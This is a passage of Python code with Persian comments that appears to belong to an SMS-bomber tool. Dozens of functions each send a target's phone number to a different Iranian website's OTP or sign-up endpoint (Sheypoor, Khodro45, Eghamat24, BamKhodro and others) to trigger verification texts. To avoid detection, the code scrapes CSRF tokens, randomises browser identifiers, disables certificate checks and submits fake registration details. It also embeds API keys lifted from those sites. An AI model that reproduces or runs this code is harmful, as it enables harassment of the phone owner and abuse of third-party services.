    data = {
        "username": normalized_phone
    }
    
    try:
        response = requests.post(
            url=url,
            json=data,
            headers=headers,
            timeout=15,
            verify=False
        )
        
        # چاپ پاسخ برای دیباگ
        print(f"{y}[Sheypoor] Status: {response.status_code}, Response: {response.text}{a}")
        
        if response.status_code in [200, 201, 202]:
            print(f"{g}[Sheypoor] کد تأیید ارسال شد{a}")
            return True
        elif response.status_code == 429:
            print(f"{y}[Sheypoor] محدودیت ارسال (Too Many Requests){a}")
            return False
        else:
            print(f"{y}[Sheypoor] خطا با کد وضعیت: {response.status_code}{a}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"{r}[Sheypoor] خطای ارتباطی: {e}{a}")
        return False
    except Exception as e:
        print(f"{r}[Sheypoor] خطای ناشناخته: {e}{a}")
        return False
        
def khodro45(phone):
    """
    تابع برای ارسال کد تأیید به API خودرو45
    """
    url = "https://khodro45.com/api/v2/customers/otp/"
    
    # تبدیل +98912... به 0912...
    normalized_phone = phone.replace("+98", "0")
    
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "accept-ranges": "bytes",
        "access-control-allow-headers": "Authorization,Accept,Origin,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Content-Range,Range",
        "access-control-allow-origin": "*",
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.{random.randint(1000, 9999)}.{random.randint(100, 999)} Safari/537.36",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    data = {
        "mobile": normalized_phone,
        "device_type": 2
    }
    
    try:
        response = requests.post(
            url=url,
            json=data,
            headers=headers,
            timeout=15,
            verify=False
        )
        
        # چاپ پاسخ برای دیباگ
        print(f"{y}[Khodro45] Status: {response.status_code}, Response: {response.text}{a}")
        
        if response.status_code in [200, 201, 202]:
            print(f"{g}[Khodro45] کد تأیید ارسال شد{a}")
            return True
        elif response.status_code == 429:
            print(f"{y}[Khodro45] محدودیت ارسال (Too Many Requests){a}")
            return False
        else:
            print(f"{y}[Khodro45] خطا با کد وضعیت: {response.status_code}{a}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"{r}[Khodro45] خطای ارتباطی: {e}{a}")
        return False
    except Exception as e:
        print(f"{r}[Khodro45] خطای ناشناخته: {e}{a}")
        return False
        
def cita(phone):
    try:
        # پاکسازی شماره
        clean_phone = phone.replace(" ", "").replace("+", "")
        if clean_phone.startswith("98"):
            clean_phone = "0" + clean_phone[2:]
        elif not clean_phone.startswith("0"):
            clean_phone = "0" + clean_phone

        url = f"https://api.cita.ir/auth/tsv/generate?username={clean_phone}"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "Basic Y2xpZW50QXBwSWQ6dGVzdA==",
            "Accept-Language": "fa",
            "Accept": "application/json, text/plain, */*",
            "Cache-Control": "max-age=31536000"
        }

        response = requests.post(url, data={}, headers=headers, timeout=10)
        print(f"[DEBUG] Status: {response.status_code}")
        try:
            data = response.json()
            print(f"[DEBUG] Response: {data}")
        except ValueError:
            print(f"[DEBUG] Response is not JSON: {response.text}")
            return False

        if response.status_code == 200:
            print("[+] Cita: OTP ارسال شد ✅")
            return True
        else:
            print(f"[-] Cita: خطا در ارسال ({response.status_code})")
            return False

    except Exception as e:
        print(f"[!] Cita Exception: {e}")
        return False
        
        

def ticketchi(phone: str):
    url = "https://www.ticketchi.ir/api/collect"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
    }
    payload = {"plaintext": phone}

    try:
        resp = requests.post(url, json=payload, headers=headers)
        if resp.status_code == 200:
            print("[+] Ticketchi: OTP درخواست شد ✅")
            try:
                data = resp.json()
                print("[DEBUG] Response:", data)
            except:
                print("[DEBUG] Response is not JSON:", resp.text)
            return True
        else:
            print(f"[-] Ticketchi: خطا در ارسال ({resp.status_code})")
            print("[DEBUG] Response:", resp.text)
            return False
    except Exception as e:
        print("[-] Ticketchi: خطا در اتصال یا ارسال:", e)
        return False
        
        
def mashinno(phone):
    """
    تابع برای ارسال کد تأیید به Mashinno
    """
    url = "https://mashinno.com/x-api/main/v1/auth/send-code"

    # تبدیل +98 به 0
    normalized_phone = phone.replace("+98", "0")

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      f"(KHTML, like Gecko) Chrome/{random.randint(90,120)}.0.{random.randint(1000,9999)}."
                      f"{random.randint(100,999)} Safari/537.36"
    }

    data = {"mobile": normalized_phone}

    try:
        response = requests.post(url, json=data, headers=headers, timeout=15, verify=False)

        print(f"[Mashinno] Status: {response.status_code}, Response: {response.text}")

        if response.status_code in [200, 201, 202]:
            print("✅ [Mashinno] کد تأیید ارسال شد")
            return True
        elif response.status_code == 429:
            print("⚠️ [Mashinno] محدودیت ارسال (Too Many Requests)")
            return False
        else:
            print(f"❌ [Mashinno] خطا با کد وضعیت: {response.status_code}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"❌ [Mashinno] خطای ارتباطی: {e}")
        return False
    except Exception as e:
        print(f"❌ [Mashinno] خطای ناشناخته: {e}")
        return 
        
def automoby(phone):
    """
    تابع برای ارسال کد تأیید به Automoby
    """
    url = "https://api.automoby.ir/api/user/login"

    # تبدیل +98 به 0
    normalized_phone = phone.replace("+98", "0")

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://automoby.ir",
        "Referer": "https://automoby.ir/",
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      f"(KHTML, like Gecko) Chrome/{random.randint(90,120)}.0.{random.randint(1000,9999)}."
                      f"{random.randint(100,999)} Safari/537.36"
    }

    data = {"phoneNumber": normalized_phone}

    try:
        response = requests.post(url, json=data, headers=headers, timeout=15, verify=False)

        print(f"[Automoby] Status: {response.status_code}, Response: {response.text}")

        if response.status_code in [200, 201, 202]:
            print("✅ [Automoby] کد تأیید ارسال شد")
            return True
        elif response.status_code == 429:
            print("⚠️ [Automoby] محدودیت ارسال (Too Many Requests)")
            return False
        else:
            print(f"❌ [Automoby] خطا با کد وضعیت: {response.status_code}")
            return False

    except requests.exceptions.RequestException as e:
        print(f"❌ [Automoby] خطای ارتباطی: {e}")
        return False
    except Exception as e:
        print(f"❌ [Automoby] خطای ناشناخته: {e}")
        return False
        
        
def mryadaki(phone):
    # تبدیل شماره به 09...
    if phone.startswith("+98"):
        normalized_phone = "0" + phone[3:]
    elif phone.startswith("98"):
        normalized_phone = "0" + phone[2:]
    else:
        normalized_phone = phone

    session = requests.Session()
    url_login = "https://www.mryadaki.com/auth/login-otp?ReturnUrl=%2Fprofile%2F"

    try:
        # دریافت صفحه ورود
        resp = session.get(url_login, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")

        # پیدا کردن توکن
        token_input = soup.find("input", {"name": "__RequestVerificationToken"})
        if not token_input:
            print("❌ [MrYadaki] خطا: نتونستم توکن پیدا کنم")
            return

        token = token_input.get("value", "")
        if not token:
            print("❌ [MrYadaki] خطا: مقدار توکن خالیه")
            return

        # ارسال شماره
        data = {
            "UserName": normalized_phone,
            "__RequestVerificationToken": token,
            "ReturnUrl": ""
        }
        headers = {"X-Requested-With": "XMLHttpRequest"}

        resp2 = session.post(url_login, data=data, headers=headers, timeout=10)

        if resp2.status_code == 200:
            print(f"✅ [MrYadaki] کد تأیید ارسال شد به شماره {normalized_phone}")
        else:
            print(f"❌ [MrYadaki] خطا: Status {resp2.status_code}")

    except Exception as e:
        print(f"❌ [MrYadaki] Exception: {e}")
        
        
        
def bamkhodro(phone, email="test@example.com", password="Test1234!@#"):
    """
    ارسال کد OTP به BamKhodro به صورت اتوماتیک
    """
    session = requests.Session()
    base_url = "https://shop.bamkhodro.ir/"

    # گرفتن صفحه اصلی برای استخراج instance_id و digits_form
    resp = session.get(base_url)
    if resp.status_code != 200:
        print("❌ نتونستم صفحه اصلی رو باز کنم")
        return False

    soup = BeautifulSoup(resp.text, "html.parser")
    
    # استخراج instance_id و digits_form
    instance_tag = soup.find("input", {"name": "instance_id"})
    form_tag = soup.find("input", {"name": "digits_form"})
    referer_tag = soup.find("input", {"name": "_wp_http_referer"})

    if not instance_tag or not form_tag or not referer_tag:
        print("❌ نتونستم instance_id یا form_id یا _wp_http_referer رو پیدا کنم")
        return False

    instance_id = instance_tag.get("value")
    digits_form = form_tag.get("value")
    wp_referer = referer_tag.get("value")

    # آماده سازی داده برای ارسال OTP
    payload = {
        "digt_countrycode": "+98",
        "phone": phone.replace("+98", "0"),
        "email": email,
        "digits_reg_password": password,
        "digits_process_register": "1",
        "sms_otp": "",
        "otp_step_1": "1",
        "digits_otp_field": "1",
        "instance_id": instance_id,
        "optional_data": "optional_data",
        "action": "digits_forms_ajax",
        "type": "register",
        "dig_otp": "otp",
        "digits": "1",
        "digits_redirect_page": f"{base_url}my-account/",
        "g-recaptcha-response": "",
        "digits_form": digits_form,
        "_wp_http_referer": wp_referer,
        "container": "digits_protected",
        "sub_action": "sms_otp"
    }

    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }

    try:
        otp_resp = session.post(f"{base_url}wp-admin/admin-ajax.php", data=payload, headers=headers, timeout=15)
        if otp_resp.status_code == 200 and '"success":true' in otp_resp.text:
            print(f"✅ [BamKhodro] کد تأیید ارسال شد به شماره {phone}")
            return True
        else:
            print(f"❌ [BamKhodro] خطا یا محدودیت ارسال: {otp_resp.text}")
            return False
    except Exception as e:
        print(f"❌ [BamKhodro] خطای ارتباطی: {e}")
        return False
        
        
        
def shojapart(phone):
    """
    ارسال کد تأیید به شماره داده شده در shojapart.com
    فقط شماره ورودی لازم است.
    """
    url = "https://shojapart.com/wp-admin/admin-ajax.php"

    data = {
        "first_name": "کاربر",
        "last_name": "تست",
        "user_email": "",
        "phone_number": phone,
        "wupp_remember_me": "on",
        "action": "wupp_sign_up"
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "*/*",
        "X-Requested-With": "XMLHttpRequest"
    }

    try:
        response = requests.post(url, data=data, headers=headers, timeout=15)

        if response.status_code == 200:
            print(f"[Shojapart] درخواست ارسال شد به شماره {phone}")
            print("پاسخ سرور:", response.text)
            return True
        else:
            print(f"[Shojapart] خطا در ارسال (کد وضعیت: {response.status_code})")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[Shojapart] خطای ارتباطی: {e}")
        return False
        
        

def proparts(phone_number):
    """
    ارسال درخواست OTP به شماره مشخص شده برای سایت proparts.ir
    ورودی:
        phone_number: شماره موبایل به فرمت 09123456789
    خروجی:
        پاسخ JSON سرور
    """
    url = "https://proparts.ir/wp-admin/admin-ajax.php"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest"
    }
    data = {
        "action": "logini_first",
        "login": phone_number
    }

    response = requests.post(url, headers=headers, data=data)
    try:
        return response.json()  # پاسخ سرور را به صورت JSON برمی‌گرداند
    except:
        return response.text  # اگر JSON نبود، متن خام را برمی‌گرداند

        

def bazari(phone, firstname="محمد", lastname="احمدی"):
    """
    شماره موبایل را به فرمت 09123456789 تبدیل و SMS ثبت‌نام در bazari ارسال می‌کند.
    """
    # فرمت کردن شماره
    phone = phone.strip()
    if phone.startswith("+98"):
        phone = "0" + phone[3:]
    elif phone.startswith("98") and len(phone) == 12:
        phone = "0" + phone[2:]

    url = "https://bazari.org/login?back=my-account"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "*/*"
    }
    data = {
        "username": phone,
        "id_customer": "",
        "back": "",
        "firstname": firstname,
        "lastname": lastname,
        "action": "register",
        "ajax": 1
    }

    try:
        res = requests.post(url, headers=headers, data=data, timeout=10)
        if res.status_code == 200:
            try:
                return res.json()  # خروجی JSON سرور
            except:
                return res.text  # اگر JSON نبود متن خام
        else:
            return f"خطا: Status Code {res.status_code}"
    except Exception as e:
        return f"خطا: {e}"


def farshonline(phone):
    # حذف فاصله و خطاهای احتمالی
    phone = phone.strip().replace(" ", "")
    
    # اگر با +98 شروع شد، به 0 تبدیل کن
    if phone.startswith("+98"):
        phone = "0" + phone[3:]
    
    # اگر با 98 شروع شد و + نداره، به 0 تبدیل کن
    elif phone.startswith("98"):
        phone = "0" + phone[2:]
    
    url = "https://farshonline.com/ajax.php"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest"
    }
    data = {
        "register": 1,
        "mobile": phone
    }
    
    res = requests.post(url, headers=headers, data=data)
    try:
        return res.text
    except:
        return res.status_code



def amirkabircarpet(phone):
    try:
        session = requests.Session()
        
        # دریافت صفحه اصلی برای استخراج CSRF token
        home_url = "https://amirkabircarpet.ir/bakala/"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        }
        
        response = session.get(home_url, headers=headers, timeout=10, verify=False)
        html = response.text
        
        # استخراج CSRF token با BeautifulSoup
        soup = BeautifulSoup(html, 'html.parser')
        csrf_token = None
        
        # جستجو در meta tags
        meta_token = soup.find('meta', {'name': 'csrf-token'})
        if meta_token:
            csrf_token = meta_token.get('content')
        
        # جستجو در input fields
        if not csrf_token:
            input_token = soup.find('input', {'name': '_token'})
            if input_token:
                csrf_token = input_token.get('value')
        
        if not csrf_token:
            print(f"{r}[-] CSRF token پیدا نشد{a}")
            return False
            
        print(f"{g}[+] CSRF token: {csrf_token}{a}")

        # ارسال درخواست
        url = "https://amirkabircarpet.ir/bakala/ajax/send_code/"
        data = {
            'action': 'bakala_send_code',
            'phone_email': phone.replace('+98', '0')
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-CSRF-TOKEN': csrf_token,
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://amirkabircarpet.ir',
            'Referer': home_url,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }

        response = session.post(url, data=data, headers=headers, timeout=10, verify=False)
        
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text}")
        
        if response.status_code == 200:
            try:
                result = response.json()
                if result.get("status") == "success":
                    print(f"{g}[+] کد ارسال شد!{a}")
                    return True
            except:
                if 'success' in response.text.lower():
                    print(f"{g}[+] کد ارسال شد!{a}")
                    return True
        return False
            
    except Exception as e:
        print(f"{r}[!] خطا: {e}{a}")
        return False  
        
        
        
def modema(phone, name="نام و نام خانوادگی"):
    # تبدیل شماره به فرمت 091xxxxxxx
    phone = phone.strip()
    if phone.startswith("+98"):
        phone = "0" + phone[3:]
    elif phone.startswith("98"):
        phone = "0" + phone[2:]
    elif phone.startswith("9") and len(phone) == 10:
        phone = "0" + phone

    url = "https://panel.modema.com/api/register-otp"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json"
    }
    data = {
        "phone": phone,
        "name": name,
        "enterName": True
    }

    try:
        response = requests.post(url, json=data, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f"[+] درخواست ارسال شد به {phone}")
            print(f"Response: {response.text}")
            return True
        else:
            print(f"[-] خطا در ارسال: Status Code {response.status_code}")
            print(f"Response: {response.text}")
            return False
    except Exception as e:
        print(f"[!] خطا: {e}")
        return False
        
        
def roozima(phone):
    url = "https://roozima.ir/api/site/v1/customer/login/?language=fa"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Authorization": "Bearer undefined",
        "User-Agent": "Mozilla/5.0"
    }
    payload = {"mobile": phone, "password": "", "loginType": 1}

    try:
        r = requests.post(url, headers=headers, json=payload, timeout=10)
        if r.status_code == 200 and (r.json().get("success") or r.json().get("data", {}).get("otp_sent")):
            print(f"[+] کد ارسال شد به {phone}")
            return True
        print(f"[-] خطا در ارسال: {r.text}")
        return False
    except Exception as e:
        print(f"[!] خطا: {e}")
        return False


def activecleaners(phone):
    try:
        # پاکسازی شماره
        clean_phone = re.sub(r"[^\d]", "", phone)
        if clean_phone.startswith("98"):
            clean_phone = "0" + clean_phone[2:]
        elif not clean_phone.startswith("0"):
            clean_phone = "0" + clean_phone
        if not re.match(r"^09\d{9}$", clean_phone):
            print(f"[!] ActiveCleaners: شماره نامعتبر")
            return False

        url = "https://uapi.activecleaners.ir/Auth/VerifyUser/GetVerifycode"
        payload = {
            "mobileOrEmail": clean_phone,
            "deviceCode": "ActiveClient[Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) "
                          "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 "
                          "Mobile/15E148 Safari/604.1]",
            "firstName": "",
            "lastName": "",
            "password": ""
        }
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) "
                          "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 "
                          "Mobile/15E148 Safari/604.1"
        }

        resp = requests.post(url, json=payload, headers=headers, verify=False, timeout=10)

        print(f"[DEBUG] Status: {resp.status_code}")
        print(f"[DEBUG] Response: {resp.text[:200]}")

        if resp.status_code == 200 and "true" in resp.text.lower():
            print("[+] ActiveCleaners: درخواست ارسال شد!")
            return True
        else:
            print(f"[-] ActiveCleaners: خطا در ارسال ({resp.status_code})")
            return False

    except Exception as e:
        print(f"[!] ActiveCleaners Exception: {e}")
        return False


def washino(phone):
    try:
        # پاکسازی شماره
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone

        if not re.match(r"^09\d{9}$", clean_phone):
            print(f"[!] Washino: شماره نامعتبر")
            return False

        url = "https://washino.app/wp-admin/admin-ajax.php"
        payload = {
            "action": "send_otp",
            "phone_number": clean_phone
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0"
        }

        response = requests.post(url, data=payload, headers=headers, timeout=10, verify=False)

        print(f"[DEBUG] Status: {response.status_code}")
        print(f"[DEBUG] Response: {response.text[:200]}")

        if response.status_code == 200 and "success" in response.text.lower():
            print(f"[+] Washino: درخواست ارسال شد!")
            return True
        else:
            print(f"[-] Washino: خطا در ارسال ({response.status_code})")
            return False

    except Exception as e:
        print(f"[!] Washino Exception: {e}")
        return False

def abanapps(phone):
    try:
        # پاکسازی شماره
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone

        if not re.match(r"^09\d{9}$", clean_phone):
            print("[!] AbanApps: شماره نامعتبر")
            return False

        url = "http://dc6.abanapps.ir/api/sms/applogin"
        payload = {
            "mobile": clean_phone
        }
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=utf-8",
            "app_token": "abd9c8dc-5c28-44b0-bb91-513193b82213",
            "User-Agent": "Mozilla/5.0"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)

        print(f"[DEBUG] Status: {response.status_code}")
        print(f"[DEBUG] Response: {response.text[:200]}")

        if response.status_code == 200:
            print("[+] AbanApps: درخواست ارسال شد!")
            return True
        else:
            print(f"[-] AbanApps: خطا در ارسال ({response.status_code})")
            return False

    except Exception as e:
        print(f"[!] AbanApps Exception: {e}")
        return False
        
def denro(phone):
    try:
        session = requests.Session()
        login_url = "https://denro.ir/my-account/"   # صفحه ثبت‌نام/ورود
        
        # ۱. گرفتن HTML صفحه
        resp = session.get(login_url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
        if resp.status_code != 200:
            print("[-] خطا در دریافت صفحه لاگین")
            return False

        html = resp.text

        # ۲. پیدا کردن instance_id و digits_form
        instance_id_match = re.search(r'name="instance_id" value="([^"]+)"', html)
        digits_form_match = re.search(r'name="digits_form" value="([^"]+)"', html)

        if not instance_id_match or not digits_form_match:
            print("[-] نتونستم instance_id یا digits_form رو پیدا کنم")
            return False

        instance_id = instance_id_match.group(1)
        digits_form = digits_form_match.group(1)

        print(f"[DEBUG] instance_id: {instance_id}")
        print(f"[DEBUG] digits_form: {digits_form}")

        # ۳. ساخت payload
        payload = {
            "digt_countrycode": "+98",
            "phone": phone,
            "digits_reg_name": "کاربر",
            "digits_process_register": "1",
            "sms_otp": "",
            "otp_step_1": "1",
            "signup_otp_mode": "1",
            "instance_id": instance_id,
            "optional_data": "optional_data",
            "action": "digits_forms_ajax",
            "type": "register",
            "dig_otp": "",
            "digits": "1",
            "digits_redirect_page": "//denro.ir/product-category/bike/",
            "digits_form": digits_form,
            "_wp_http_referer": "/product-category/bike/",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }

        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0"
        }

        # ۴. ارسال درخواست OTP
        otp_url = "https://denro.ir/wp-admin/admin-ajax.php"
        resp2 = session.post(otp_url, data=payload, headers=headers, timeout=10)

        print(f"[DEBUG] Status: {resp2.status_code}")
        print(f"[DEBUG] Response: {resp2.text[:200]}")

        if resp2.status_code == 200 and "success" in resp2.text.lower():
            print("[+] درخواست ارسال شد (باید کد بیاد)")
            return True
        else:
            print("[-] ارسال موفق نبود")
            return False

    except Exception as e:
        print(f"[!] Exception: {e}")
        return False
        
        
def milli_gold(phone, operation="REGISTER_USER"):
    try:
        # پاکسازی شماره
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '+98' + clean_phone[2:]
        elif not clean_phone.startswith('+98'):
            clean_phone = '+98' + clean_phone[1:] if clean_phone.startswith('0') else '+98' + clean_phone

        if not re.match(r"^\+989\d{9}$", clean_phone):
            print("[!] Milli Gold: شماره نامعتبر")
            return False

        url = "https://milli.gold/api/v1/public/otp"
        payload = {
            "mobileNumber": clean_phone,
            "operation": operation
        }
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "X-Platform": "PWA",
            "X-Channel": "MILLI",
            "X-Client-Version": "1.0.0"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        print(f"[DEBUG] Status: {response.status_code}")

        try:
            data = response.json()
            print(f"[DEBUG] Response: {str(data)[:200]}")
        except ValueError:
            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
            return False

        if response.status_code == 200 and data.get("success", False):
            print("[+] Milli Gold: OTP ارسال شد")
            return True
        else:
            print(f"[-] Milli Gold: خطا در ارسال ({response.status_code})")
            return False

    except Exception as e:
        print(f"[!] Milli Gold Exception: {e}")
        return False
        
        
def technogold(phone, token=None):
    try:
        # پاکسازی شماره
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone

        if not re.match(r"^09\d{9}$", clean_phone):
            print("[!] TechnoGold: شماره نامعتبر")
            return False

        url = "https://api2.technogold.gold/customer/auth/send-otp?device_type=web"
        payload = {"mobile": clean_phone}

        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
        }
        if token:
            headers["x-token"] = token

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        print(f"[DEBUG] Status: {response.status_code}")

        try:
            data = response.json()
            print(f"[DEBUG] Response: {str(data)[:200]}")
        except ValueError:
            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
            return False

        if response.status_code == 200 and data.get("success", False):
            print("[+] TechnoGold: OTP ارسال شد")
            return True
        else:
            print(f"[-] TechnoGold: خطا در ارسال ({response.status_code})")
            return False

    except Exception as e:
        print(f"[!] TechnoGold Exception: {e}")
        return False
        
def bargheto(phone):
    try:
        # پاکسازی شماره
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone

        if not re.match(r"^09\d{9}$", clean_phone):
            print("[!] Bargheto: شماره نامعتبر")
            return False

        url = "https://back.bargheto.com:13002/Authentication/SendOtp"
        payload = {"PhoneNumber": clean_phone}
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Authorization": "undefined"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        print(f"[DEBUG] Status: {response.status_code}")
        try:
            data = response.json()
            print(f"[DEBUG] Response: {str(data)[:200]}")
        except ValueError:
            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
            return False

        if response.status_code == 200 and data.get("success", False):
            print("[+] Bargheto: OTP ارسال شد")
            return True
        else:
            print(f"[-] Bargheto: خطا در ارسال ({response.status_code})")
            return False

    except Exception as e:
        print(f"[!] Bargheto Exception: {e}")
        return False



def barghapp(phone, firstname="نام", lastname="خانوادگی", nationalCode="3344434443", gender="1", provinceId=4, cityId=124, zipCode="73763736"):
    try:
        # پاکسازی شماره
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
        elif not clean_phone.startswith('0'):
            clean_phone = '0' + clean_phone

        if not re.match(r"^09\d{9}$", clean_phone):
            print("[!] BarghApp: شماره نامعتبر")
            return False

        url = "http://barghapp.clean-energy.ir:64430/api/Authenticate/RegisterReal"
        payload = {
            "nationalCode": nationalCode,
            "mobile": clean_phone,
            "firstName": firstname,
            "lastName": lastname,
            "gender": gender,
            "provinceId": provinceId,
            "cityId": cityId,
            "address": None,
            "zipCode": zipCode,
            "emailAddress": None
        }
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json"
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)
        print(f"[DEBUG] Status: {response.status_code}")

        try:
            data = response.json()
            print(f"[DEBUG] Response: {str(data)[:200]}")
        except ValueError:
            print(f"[DEBUG] Response is not JSON: {response.text[:200]}")
            return False

        if response.status_code == 200 and data.get("success", True):  # برخی API ها success ندارند
            print("[+] BarghApp: درخواست ثبت نام ارسال شد")
            return True
        else:
            print(f"[-] BarghApp: خطا در ارسال ({response.status_code})")
            return False

    except Exception as e:
        print(f"[!] BarghApp Exception: {e}")
        return False
        
        
        

def azno(phone):
    try:
        phone = re.sub(r"^(?:\+98|98|0)?", "0", phone)
        if not re.match(r"^09\d{9}$", phone):
            print("[!] Azno: شماره نامعتبر"); return False

        url = f"https://api-main.azno.space/api/Auth/SendOTP?phoneNumber={phone}&method=sms"
        r = requests.post(url, headers={"Accept":"application/json","Content-Type":"application/json"}, timeout=10)

        data = r.json() if r.headers.get("content-type","").startswith("application/json") else {}
        if r.status_code == 200 and data.get("success"):
            print("[+] Azno: OTP ارسال شد"); return True
        print(f"[-] Azno: خطا ({r.status_code})"); return False

    except Exception as e:
        print(f"[!] Azno Exception: {e}"); return False


def denj(phone):
    try:
        phone = re.sub(r"^(?:\+98|98|0)?", "0", phone)
        if not re.match(r"^09\d{9}$", phone):
            return False

        r = requests.post(
            "https://api.denj.space/api/v1/account/auth/register-or-login/",
            json={"phone_number": phone},
            headers={"Accept": "application/json", "Content-Type": "application/json"},
            timeout=10
        )
        return r.status_code == 200
    except:
        return False
        
        
def eghamat24(phone):
    try:
        session = requests.Session()
        
        # 1. صفحه اصلی
        main_url = "https://www.eghamat24.com/"
        resp = session.get(main_url, timeout=10)
        if resp.status_code != 200:
            print(f"[-] Eghamat24: خطا در دریافت صفحه ({resp.status_code})")
            return False
        
        # 2. گرفتن XSRF-TOKEN
        xsrf_token = session.cookies.get("XSRF-TOKEN")
        if not xsrf_token:
            print("[-] Eghamat24: نتونستم XSRF-TOKEN پیدا کنم")
            return False
        
        # 3. هدرها
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Client-Token": "MzJhY2UwMTM0NjQ4ZTg1Njg4M2JiMzA1YWIyNzRhYWU3ZGVmZTEwZQ==",
            "x-api-key": "PNF0)VZI|*nLpY:V+@r$*ZrISF?ru2_,-K5tC5}O5x19yv;XUwHpI(!XBhl?C.MD",
            "Content-Type": "application/json",
            "X-XSRF-TOKEN": xsrf_token,
        }

        payload = {"username": phone}

        # 4. ارسال
        url = "https://www.eghamat24.com/user/v2/send-otp"
        r = session.post(url, json=payload, headers=headers, timeout=10)

        print(f"[DEBUG] Status: {r.status_code}")
        try:
            data = r.json()
            print(f"[DEBUG] Response: {data}")
        except:
            print(f"[DEBUG] Response text: {r.text[:200]}")
            return False

        # شرط موفقیت درست
        if r.status_code == 200 and data.get("code") == 200:
            print("[+] Eghamat24: کد ارسال شد ✅")
            return True
        else:
            print(f"[-] Eghamat24: خطا ({data})")
            return False

    except Exception as e:
        print(f"[!] Eghamat24 Exception: {e}")
        return False
        

def hotelyar(phone):
    try:
        # پاکسازی شماره
        clean_phone = phone.replace('+', '').replace(' ', '')
        if clean_phone.startswith('98'):
            clean_phone = '0' + clean_phone[2:]
